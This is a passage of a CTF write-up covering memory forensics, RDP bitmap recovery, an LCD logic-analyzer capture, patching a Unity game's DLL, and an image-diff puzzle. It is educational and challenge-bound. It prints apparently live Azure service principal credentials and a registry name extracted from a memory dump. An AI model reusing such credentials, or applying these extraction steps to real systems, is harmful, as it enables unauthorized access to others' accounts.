class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;This Is My Secret&quot;</span> &gt; secret.txt</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ podman login -u $(<span class=\"built_in\">head</span> -n 2 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>) -p $(<span class=\"built_in\">head</span> -n 3 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>)</span><br><span class=\"line\">raf-square@ubuntu:~$ podman pull nginx</span><br><span class=\"line\">^Craf-square@ubuntu:~$ <span class=\"built_in\">cd</span> LiME/src/</span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">u:~$ podman login -u $(<span class=\"built_in\">head</span> -n 2 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>) -p $(<span class=\"built_in\">head</span> -n 3 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>Mmmm nice! now at least we got some commands and we got the user-name and host-name !<br>\nFrom these commands we can understand that the user edit  <code>/etc/containers/registries.conf</code> , then create a  <code>secret.txt</code> . Then logged in with podman using that secret.txt. But we don’t have any information about the content of the creds in these commands!.</p>\n<p>We have 2 methods to figure out what’s happen and get the creds!</p>\n<p>either running a strings and grepping on  <code>CMDLINE=podman login</code>  or grepping on  <code>This Is My Secret</code>  and check the lines before and after to see the content!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;CMDLINE=podman login&quot;</span>       </span><br><span class=\"line\">_CMDLINE=podman login -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br></pre></td></tr></table></figure>\n<p>OR</p>\n<figure class=\"highlight bash\"><figcaption><span>extract creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei -C 2 <span class=\"string\">&quot;This Is My Secret&quot;</span> </span><br><span class=\"line\"> Documents  LiME         Music     Public      Templates</span><br><span class=\"line\">Desktop  Downloads  Linux64.mem  Pictures  secret.txt  Videos</span><br><span class=\"line\">raf-square@ubuntu:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;This Is My Secret&quot;</span> &gt; secret.txt</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">fctt</span><br><span class=\"line\">--</span><br><span class=\"line\">application/octet-stream</span><br><span class=\"line\">text/plain</span><br><span class=\"line\">This Is My Secret</span><br><span class=\"line\">Service principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894</span><br><span class=\"line\">Service principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br><span class=\"line\">--</span><br></pre></td></tr></table></figure>\n<p>So the creds are  <code>2ecf92b1-83a8-4355-8cb7-8354f4677894:fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</code></p>\n<p>But I didn’t think this is a normal creds for  <code>dockerhub</code>  or any public famous container registry! Espacially he pulled a container named nginx! I bet that nginx is a customized one and its a trick!</p>\n<p>Editing  <code>/etc/containers/registries.conf</code>  can confirm that change something! This configuration file used by the container runtime environment on Linux systems. This file specifies a list of container image registries that are trusted by the system and can be used to download container images.</p>\n<p>So let’s discover how to get the registry! Pulling nginx means he pulled the latest tag or at least he tried that! So let’s grep on  <code>nginx:latest</code></p>\n<figure class=\"highlight bash\"><figcaption><span>extract registry</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;nginx:latest&quot;</span>  </span><br><span class=\"line\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span><br><span class=\"line\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span><br><span class=\"line\"><span class=\"string\">&quot;, &quot;</span>qualsk8s.azurecr.io/nginx:latest<span class=\"string\">&quot;) not found</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br></pre></td></tr></table></figure>\n<p>Bingo!  <code>qualsk8s.azurecr.io</code>  is the container registry! If you are an Azure guy you can get that from the previous step! when we get this output!</p>\n<figure class=\"highlight text\"><figcaption><span>creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Service principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894</span><br><span class=\"line\">Service principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br></pre></td></tr></table></figure>\n<p>Ok it’s time to login and pull that image and run it!</p>\n<figure class=\"highlight bash\"><figcaption><span>login and pull</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login qualsk8s.azurecr.io -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb </span><br><span class=\"line\"></span><br><span class=\"line\">docker pull nginx</span><br></pre></td></tr></table></figure>\n<p>After checking the image! I got that it’s a static web page so let’s run it!</p>\n<figure class=\"highlight bash\"><figcaption><span>run nginx</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name chall -p 80:80 -d nginx </span><br></pre></td></tr></table></figure>\n<p>After running this container we got this web-page and guess what!! There is a flag icon! Let’s check it !<br>\n<img data-src=\"https://i.imgur.com/q3GSPiL.png\" alt=\"\"></p>\n<p>This flag icon lead you to this link  <code>https://pastebin.com/vjFtjMga</code>  which is protected pastebin<br>\nhow to get that password now! Let’s check the docker history!</p>\n<figure class=\"highlight bash\"><figcaption><span>docker history</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mohamed@RafSquare:~$ docker <span class=\"built_in\">history</span> qualsk8s.azurecr.io/nginx</span><br><span class=\"line\">IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT</span><br><span class=\"line\">093f65335d3a   13 days ago   ENTRYPOINT [<span class=\"string\">&quot;nginx&quot;</span> <span class=\"string\">&quot;-g&quot;</span> <span class=\"string\">&quot;daemon off;&quot;</span>]         0B        buildkit.dockerfile.v0</span><br><span class=\"line\">&lt;missing&gt;      13 days ago   RUN /bin/sh -c <span class=\"built_in\">chmod</span> +r -R . <span class=\"comment\"># buildkit         563kB     buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      13 days ago   RUN /bin/sh -c <span class=\"built_in\">mv</span> password.txt .hidden.txt <span class=\"comment\">#…   11B       buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      13 days ago   COPY ./ ./ <span class=\"comment\"># buildkit                           563kB     buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      3 weeks ago   RUN /bin/sh -c <span class=\"built_in\">rm</span> -rf ./* <span class=\"comment\"># buildkit            0B        buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      3 weeks ago   WORKDIR /usr/share/nginx/html                   0B        buildkit.dockerfile.v0</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; apkArch=<span class=\"string\">&quot;<span class=\"subst\">$(cat /etc…   29.2MB</span></span></span><br><span class=\"line\"><span class=\"subst\"><span class=\"string\">&lt;missing&gt;      5 weeks ago   /bin/sh -c #(nop)</span>  ENV NJS_VERSION=0.7.9        0B</span></span><br><span class=\"line\"><span class=\"string\">&lt;missing&gt;      5 weeks ago   /bin/sh -c #(nop)  CMD [&quot;</span>nginx<span class=\"string\">&quot; &quot;</span>-g<span class=\"string\">&quot; &quot;</span>daemon…   0B</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  STOPSIGNAL SIGQUIT           0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  EXPOSE 80                    0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENTRYPOINT [&quot;/docker-entr…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:e57eef017a414ca7…   4.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:abbcbf84dc17ee44…   1.27kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:5c18272734349488…   2.12kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:7b307b62e82255f0…   1.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; addgroup -g 101 -S …   4.45MB</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENV PKG_RELEASE=1            0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENV NGINX_VERSION=1.23.3     0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  LABEL maintainer=NGINX Do…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  CMD [&quot;/bin/sh&quot;]              0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) ADD file:40887ab7c06977737…   7.05MB</span></span><br></pre></td></tr></table></figure>\n<p>And yes!! There is  <code>.hidden.txt</code>  that contain a password for sure ! let’s get that password!</p>\n<figure class=\"highlight bash\"><figcaption><span>docker exec</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it 460fc5a977c5 <span class=\"built_in\">cat</span> .hidden.txt</span><br><span class=\"line\">vT56X19Qu3</span><br></pre></td></tr></table></figure>\n<p>We got this pastebin !</p>\n<p><img data-src=\"https://i.imgur.com/N4B9j4z.png\" alt=\"\"></p>\n<p>This is will lead us to word sheet that contains a hex data!</p>\n<p><img data-src=\"https://i.imgur.com/P0hrYhX.png\" alt=\"\"></p>\n<p>The hex data seams introducing spaces and tabs! I don’t care let’s decode it and see what’s will be!<br>\nI’ll try to convert it to a file using  <code>xxd</code>  and import that file to <span class=\"exturl\" data-url=\"aHR0cDovL2Rjb2RlLmZy\">dcode.fr</span></p>\n<figure class=\"highlight bash\"><figcaption><span>xxd</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxd -r -p hex.txt &gt; result.txt</span><br></pre></td></tr></table></figure>\n<p>Yeah it’s a file that contains a lot of spaces! Its whitespaces</p>\n<p>Bingo! This is the flag  <code>Securinets&#123;208e5976c9d654e47d73ef44cabc272d&#125;</code></p>\n<h1 id=\"digital-forensics-recover-my-work\"><a class=\"markdownIt-Anchor\" href=\"#digital-forensics-recover-my-work\">#</a> Digital Forensics: Recover my Work 😦</h1>\n<p><img data-src=\"https://i.imgur.com/DWMzUMB.png\" alt=\"\"></p>\n<p>We got a file named  <code>memory.dmp</code> . It’s a memory dump for sure! Let’s run imageinfo plugin to get our profile!</p>\n<figure class=\"highlight bash\"><figcaption><span>profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp imageinfo</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br></pre></td></tr></table></figure>\n<p>But sadly we got this type of outpût! I bet that the suggested profile (in case it exists) will be wrong! Let’s know the exact profile with my own way! Let’s run strings the file and grep “service pack”</p>\n<figure class=\"highlight text\"><figcaption><span>Extract info</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows 7 Professional, 64-bit Service Pack 1 (Build 7601)</span><br></pre></td></tr></table></figure>\n<p>Cool, This build and service pack is supported by  <code>Win7SP1x64</code> ! I guess that imageinfo plugin got problem because the iso is customizated !</p>\n<p>Let’s start checking our memory dump! First thing should be checked is the running processes! I’ll use pstree for that thing!</p>\n<p><img data-src=\"https://i.imgur.com/1xA56pZ.png\" alt=\"\"></p>\n<p>MMMM intersting! Found chrome, firefox, outlook and RDP opened! what a trip! After digging on chrome history and firefox, I found rabbit holes and some links to wordlists! Bad Author (Me).</p>\n<p>Checking the consoles plugin too. Another rabbit hole! rabbit hole everywhere!</p>\n<p>It’s time to check and figure out that outlook process!<br>\nOutlook save the mails as pst or ost files! These files contains the mails data such as the message, attachements, sender/receiver information!</p>\n<p>So let’s try to extract these files !</p>\n<figure class=\"highlight bash\"><figcaption><span>check files</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win7SP1x64 filescan | grep -i pst$</span><br><span class=\"line\">0x000000007d81a490      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst</span><br><span class=\"line\">0x000000007dd59340      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst</span><br><span class=\"line\">0x000000007dd73220      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst</span><br><span class=\"line\">0x000000007e3f8b30      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst</span><br><span class=\"line\">0x000000007e5297a0      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst</span><br><span class=\"line\">0x000000007e5eee60     30      0 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst</span><br></pre></td></tr></table></figure>\n<p>After extracting the files using  <code>dumpfiles</code>  plugin and making sure that the files are safe and not corrupted. I opened them using a pst online viewer!</p>\n<p>The 1st mail i got it is from Adam! He send to me a zip file inside mega storage after our online meeting! I bet that zip is protected with that boring password</p>\n<p><img data-src=\"https://i.imgur.com/9a0GCzz.png\" alt=\"\"></p>\n<p>Ah my bad! The mega too is protected! We need the encryption key!</p>\n<p><img data-src=\"https://i.imgur.com/hEG0dsu.png\" alt=\"\"></p>\n<p>Let’s check the other mail! and as expected Adam forget to share the decryption key of the mega link to open the zip!</p>\n<p><img data-src=\"https://i.imgur.com/wB3m3QV.png\" alt=\"\"></p>\n<p>Bingo we got the zip! But it’s protected! Tried bruteforcing the password. But I failed!</p>\n<p>Mmmm Let’s think a little bit! The author said that he used to use the same password! We need to find another usage of that password to open the zip and get the flag!</p>\n<p>And It’s time to investigate the  <code>mstsc.exe</code>  or let’s just say the RDP! Remote Desktop?? Mmmm how to extract information from that thing?</p>\n<p>Let’s talk brievly! Extracting the memory part used by RDP can save our life! I’ll try to recover what the user see when he used RDP!!!</p>\n<p>Yes this possible dear reader, Don’t worry You’ll see how! Just make sure that you have  <code>Gimp</code></p>\n<p>Let’s now extract the memory part used by RDP process using the  <code>memdump</code>  plugin in volatility!</p>\n<figure class=\"highlight bash\"><figcaption><span>memdump</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win7SP1x64 memdump -p 360 -D .</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">************************************************************************</span><br><span class=\"line\">Writing mstsc.exe [   360] to 360.dmp</span><br></pre></td></tr></table></figure>\n<p>After getting that file! Let’s change its extension from  <code>.dmp</code>  to  <code>.data</code>  and open that file with gimp!</p>\n<p><img data-src=\"https://i.imgur.com/k3uwJ0M.png\" alt=\"\"></p>\n<p>Now it’s time for focusing! Yeah focusing will save your time! Many people can’t figure or recover images quickly! But believe me focusing on the noise will help you recover the data in a short time!</p>\n<p>After 4 mins of playing with offset and width i got it!</p>\n<p>Check the offset and the width!</p>\n<p><img data-src=\"https://i.imgur.com/wI2SQK7.png\" alt=\"\"></p>\n<p>Ohhh man! The user was opened <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuc2VjdXJpbmV0cy50bg==\">https://ctf.securinets.tn</span> (check it for know more information about our CTFs events xD ) and tried to secure a zip file with that shitty password!</p>\n<p>Finally This is the flag  <code>Securinets&#123;R3M0tE_DeSKtOp_1s_FunNy_!_!&#125;</code></p>\n<h1 id=\"hardware-liquid-display\"><a class=\"markdownIt-Anchor\" href=\"#hardware-liquid-display\">#</a> Hardware: Liquid Display</h1>\n<p><img data-src=\"https://i.imgur.com/YVrQJqG.png\" alt=\"\"></p>\n<p>We got an image and a data file!<br>\n<img data-src=\"https://i.imgur.com/5Enx08x.png\" alt=\"\"></p>\n<p>The image contains an LCD 16x2 SPI connected to something called  <code>WOKWI LOGIC</code></p>\n<p>After some searching I got that this component is a logic analyzer. But wait!! What is that??</p>\n<p>A logic analyzer is an electronic instrument that captures and displays multiple signals from a digital system or digital circuit. A logic analyzer may convert the captured data into timing diagrams, protocol decodes, state machine traces…</p>\n<p><img data-src=\"https://imgur.com/WEzP4bO.png\" alt=\"\"></p>\n<p>As my friend said this is the hardware wireshark xD</p>\n<p>So we can understand now that this circuit capture the signals of each pin of the LCD and the data file is the capture file that contains the files!</p>\n<p>So after some searching we get how to open that data file (which is a ASCII text file, I didn’t recommend to analyse it as text file).</p>\n<p>You can check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLndva3dpLmNvbS9ndWlkZXMvbG9naWMtYW5hbHl6ZXI=\">link</span> to get more information about the logic analyzer!</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaWdyb2sub3JnL3dpa2kvRG93bmxvYWRz\">PulseView</span> is an open source Logic Analyzer GUI belongs to The sigrok project that aims at creating a portable, cross-platform, Free/Libre/Open-Source signal analysis software suite that supports various device types</p>\n<p>I’ll use that Logic Analyzer GUI for this challenge!</p>\n<p><img data-src=\"https://imgur.com/6HyLxUY.png\" alt=\"\"></p>\n<p>Import the file data in this way! and let’s the show begin!</p>\n<p><img data-src=\"https://imgur.com/MLrvWUk.png\" alt=\"\"></p>\n<p>A lot of fun wait us right?! Don’t worry man! This is not that super hard! Just all what we need to do now is to simulate these signals manually! These signals are sent to the LCD and that LCD display something (It should be the flag!). So we need to understand how LCD works! I recommend to read the datasheet this thing!</p>\n<p>I will not re-write what the datasheet said! so read it! You should understand how the LCD dispaly chars!</p>\n<p><img data-src=\"https://imgur.com/vnZLXyb.png\" alt=\"\"></p>\n<p>Also don’t forget to check the instruction table and understand how these instruction works!</p>\n<p><img data-src=\"https://imgur.com/xsRciDM.png\" alt=\"\"></p>\n<p>Let’s just take an example of the 1st instruction! The  <code>Clear Display</code> . This instruction clear all the data and return the cursor to the original status! Ah yeah of course you must to understand that LCD have cursors, display modes …</p>\n<p>After understand how this LCD works it’s time to check how characters are written on that LCD!</p>\n<p><img data-src=\"https://imgur.com/5JQEtHj.png\" alt=\"\"></p>\n<p>This table will help us to convert the signals to chars and recover our flag!</p>\n<p>After reading the datasheet. You will understand that the D0 (that correspond to RS pin) can help you to understand when the display device clear the chars and reset the cursor or write something on the screen!</p>\n<p><img data-src=\"https://imgur.com/QTfwCZC.png\" alt=\"\"></p>\n<p>If you take a closer look you’ll get it! The guy who write the program write something and clear it then write another thing then delete it and so on!<br>\n<img data-src=\"https://imgur.com/GSgaCKF.png\" alt=\"\"></p>\n<p>So now it’s time to check the write blocks and check what that guy try to do! After reversing all the block i got the flag! It’s on the last block! Let me show you how I recover that data!</p>\n<p><img data-src=\"https://imgur.com/HZcwRyX.png\" alt=\"\"></p>\n<p>Using the characters table you can recover the flag! Mapping the signal and the Big table lead you to the flag!</p>\n<p>And This is will be our flag!  <code>Securinets&#123;LcD_1s_H4rD_!:(&#125;</code></p>\n<h1 id=\"game-hacking-platformer\"><a class=\"markdownIt-Anchor\" href=\"#game-hacking-platformer\">#</a> Game Hacking: Platformer:</h1>\n<p><img data-src=\"https://imgur.com/OAyXmNQ.png\" alt=\"\"></p>\n<p>In this challenge we have a game made by unity! It’s 2D platformer game where the player can jump and run in the map! But where is the flag??<br>\n<img data-src=\"https://imgur.com/oIzwhG8.png\" alt=\"\"></p>\n<p>Mmmmm my sixth sense told me that the flag is hidden somewhere in the map and the player can’t reach it! Hack Time!!!</p>\n<p>Let’s change the player ability and let him can move in any place we want it. By disabling the collision and physics mechanism! Good bye gravitiy,Rigidbody,collisions!</p>\n<p>To do this let’s open  <code>Assembly-CSharp.dll</code>  located in  <code>Platformer_Data/Managed</code>  folder.</p>\n<p>Wow! This is the player controller code! that allow the player to move and the animation to be played and responsable for jumping and detect ground detection to deny player to jump many times on the air!</p>\n<p><img data-src=\"https://imgur.com/eD0vAq0.png\" alt=\"\"></p>\n<p>Boring mechanism!! Let me change this shitty code by mine! I’ll let the player move to any point he want!</p>\n<p><img data-src=\"https://imgur.com/DZqPB6p.png\" alt=\"\"><br>\nYou can copy that code</p>\n<figure class=\"highlight csharp\"><figcaption><span>change mechanism</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">Start</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.rb = <span class=\"keyword\">base</span>.GetComponent&lt;Rigidbody2D&gt;();</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.rb.isKinematic = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.anim = <span class=\"keyword\">base</span>.GetComponent&lt;Animator&gt;();</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.mySpriteRenderer = <span class=\"keyword\">base</span>.GetComponent&lt;SpriteRenderer&gt;();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Token: 0x06000005 RID: 5</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">FixedUpdate</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">float</span> axisRaw = Input.GetAxisRaw(<span class=\"string\">&quot;Horizontal&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">float</span> verticalInput = Input.GetAxisRaw(<span class=\"string\">&quot;Vertical&quot;</span>);</span><br><span class=\"line\">\tVector3 movement = <span class=\"keyword\">new</span> Vector3(axisRaw, verticalInput, <span class=\"number\">0f</span>).normalized * <span class=\"number\">10f</span> * Time.deltaTime;</span><br><span class=\"line\">\t<span class=\"keyword\">base</span>.transform.Translate(movement);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>After applying the changes our player can now go to any place we want! But i didn’t find the flag! Oh god! This is what i found!<br>\n<img data-src=\"https://imgur.com/6PRgDFo.png\" alt=\"\"></p>\n<p>I checked all the map and sadly nothing interesting 😦</p>\n<p>Let’s check the files again! Maybe we will find something!</p>\n<p><img data-src=\"https://imgur.com/MZ9tbCH.png\" alt=\"\"></p>\n<p>Oh man look here! I found that there is levels on this game! Let me back to the decompiled code!</p>\n<p><img data-src=\"https://imgur.com/yM0C7nL.png\" alt=\"\"></p>\n<p>Oh no! The game is opened on the 2nd level! Let’s change this room to “Level1” and Play again! And yes It’s a new Level</p>\n<p><img data-src=\"https://imgur.com/me4efrx.png\" alt=\"\"></p>\n<p>After moving right and left, I found the flag!</p>\n<p><img data-src=\"https://imgur.com/gj4wGE9.png\" alt=\"\"></p>\n<p>And Yes We did it! Just move right and left and collect the letters ! and you’ll get this one ! Wrap it in Securinets{}<br>\n<img data-src=\"https://imgur.com/cpA2O6c.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;Gam1ng_AnD_L0VE&#125;</code></p>\n<h1 id=\"misc-full-difference\"><a class=\"markdownIt-Anchor\" href=\"#misc-full-difference\">#</a> Misc: Full Difference</h1>\n<p><img data-src=\"https://imgur.com/dROW4SQ.png\" alt=\"\"></p>\n<p>Full Difference, The difference will make a difference! What is that thing ?? we got 2 images with different type but same picture!<br>\n<img data-src=\"https://imgur.com/dr87PxX.png\" alt=\"\"></p>\n<p>Thinking a little bit can we understand what the author means! Full difference! It means that the pixels should be different a full difference! which means the Red,Green and Blue channels should be differents!</p>\n<p>“Will make a difference!” After extracting the different pixels we should calculate the difference between each channels ?? Mmmmm makes sense!</p>\n<figure class=\"highlight python\"><figcaption><span>solver</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL 